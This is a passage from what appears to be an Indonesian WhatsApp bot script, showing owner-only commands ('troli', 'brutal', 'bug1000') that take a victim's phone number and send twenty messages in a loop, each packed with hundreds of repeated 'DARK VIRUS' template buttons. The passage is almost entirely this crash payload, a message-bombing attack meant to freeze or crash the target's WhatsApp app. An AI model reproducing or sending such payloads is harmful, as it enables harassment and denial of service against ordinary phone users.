{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})}
await sleep(ms(waktu))
break
//=============================================================================================================
case 'troli':
case 'brutal':
case 'bug1000':
if (!ItsukaAllanBae) return itsuka.reply(`sorry anda sepertinya bukan pemilik bot`)
if (!q) return itsuka.reply(`Contoh ${prefix+command} 628xx`)
txts = `SUCCES ✅`
itsuka.reply(txts)
if (!q) return 
num = `${q}`+'@s.whatsapp.net'
jumlah = '20'
waktu = `5s`
for (let i = 0; i < jumlah; i++) {
allan.sendMessage(num, {
text: 'BUG BY ItsukaAllan', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
